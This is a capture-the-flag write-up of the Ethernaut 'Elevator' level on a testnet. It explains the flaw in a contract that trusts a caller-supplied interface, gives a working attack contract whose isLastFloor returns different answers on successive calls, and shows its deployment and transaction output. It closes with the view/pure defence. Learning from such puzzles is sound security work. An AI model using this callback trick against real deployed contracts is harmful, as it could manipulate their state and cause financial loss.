# 11 - Elevator

## Challenge

This elevator won't let you reach the top of your building. Right?

Things that might help:

- Sometimes solidity is not good at keeping promises.
- This `Elevator` expects to be used from a `Building`.

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}

contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}
```

## Summary

In this level, we have a `Building` interface with `isLastFloor` method. We also have the deployed `Elevator`, it has `top` initialized to true, and we have a `goTo` method. In this method, if the given `_floor` is last floor, then we do nothing; otherwise, update `floor` to `_floor` and `top` to `isLastFloor(_floor)`. Because we enter the if statement when `_floor` is not last floor, `top` will be set to false. It seems we cannot set `top` to true either way.

The vulnerability here is that `Building` is a contract, and we can deploy a contract that implements `Building` interface. In this contract, we can implement `isLastFloor` to return true when `floor` is 1, and false otherwise. Then we can call `goTo` with `_floor` set to 1, and `top` will be set to true. We can do this because `Building` is an interface, and `isLastFloor` is modifiable without `view` or `pure` keyword.

## Walkthrough

```py
>>> from cheb3 import Connection
>>> from cheb3.utils import compile_sol
>>> conn = Connection("https://goerli.infura.io/v3/<key>")
>>> account = conn.account("<priv_key>")
>>> contract_addr = '0xe1162db2DCE5e9b9163C817278fa50fab2026De7'
```

Deploy `Building` contract with `Elevator` interface:

```py
>>> abi, bytecode = compile_sol('''
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IElevator {
    function goTo(uint) external;
}

contract Building {
    bool public isLast = false;

    function hack(address _addr) public {
        IElevator elevator = IElevator(_addr);
        elevator.goTo(1);
    }

    function isLastFloor(uint) external returns (bool) {
        if (isLast == false) {
            isLast = true;
            return false;
        }
        return isLast;
    }
}
''',
solc_version="0.8.17",
base_path="Ethernaut/node_modules/"
)['Building']
```

Let's explain this a bit:

```js
interface IElevator {
    function goTo(uint) external;
}
```

Defines an interface to be called in `Building`.

```js
function hack(address _addr) public {
    IElevator elevator = IElevator(_addr);
    elevator.goTo(1);
}
```

Upon calling `hack` with level contract address, we initialize `Elevator` instance, and call `goTo` with `_floor` set to 1. This will invoke `Elevator`'s `goTo` method:

```js
function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
```

Which in turn initializes `Building` instance, and calls `isLastFloor(1)`. Let's see how `Building` implements `isLastFloor`:

```js
bool public isLast = false;

function isLastFloor(uint) external returns (bool) {
    if (isLast == false) {
        isLast = true;
        return false;
    }
    return isLast;
}
```

If it is not last floor (e.g. here 1 is not last floor), we set `isLast` to true and actually return false. In this way, `if (! building.isLastFloor(_floor))` will enter and we can also set `floor` to `_floor = true` at the same time!

At this stage, we should have `top` set to true.

```py
>>> attackContract = conn.contract(account, abi=abi, bytecode=bytecode)
>>> attackContract.deploy(contract_addr)
2023-06-15 22:35:56.977 | DEBUG    | cheb3.contract:deploy:94 - Deploying contract ...
2023-06-15 22:36:13.030 | INFO     | cheb3.contract:deploy:99 - The contract is deployed at 0x1525D6D0eDCAEE236C31720e7230a4932E00b78a
>>> attackContract.functions.hack(contract_addr).send_transaction()
2023-06-15 22:36:41.449 | INFO     | cheb3.contract:send_transaction:236 - (0x1525D6D0eDCAEE236C31720e7230a4932E00b78a).hack transaction hash: 0x3cc2d0309c42a96c2134713fb372841eca64ebeaf32d053950d3e9196715a388
AttributeDict({'blockHash': HexBytes('0x8e3667cb40184ffb54c11fd50e4155e832dd354b5348a5b03f078ba61c98b186'), 'blockNumber': 9186836, 'contractAddress': None, 'cumulativeGasUsed': 29172488, 'effectiveGasPrice': 119, 'from': '0x0b26C24d538e3dfF58F7c733535e65a6674FB3aB', 'gasUsed': 94115, 'logs': [], 'logsBloom': HexBytes('0x00..00'), 'status': 1, 'to': '0x1525D6D0eDCAEE236C31720e7230a4932E00b78a', 'transactionHash': HexBytes('0x3cc2d0309c42a96c2134713fb372841eca64ebeaf32d053950d3e9196715a388'), 'transactionIndex': 160, 'type': 0})
```

Finally, submit the instance to pass the level.

## Afterword

You can use the `view` function modifier on an interface in order to prevent state modifications. The `pure` modifier also prevents functions from modifying the state. Make sure you read [Solidity's documentation](http://solidity.readthedocs.io/en/develop/contracts.html#view-functions) and learn its caveats.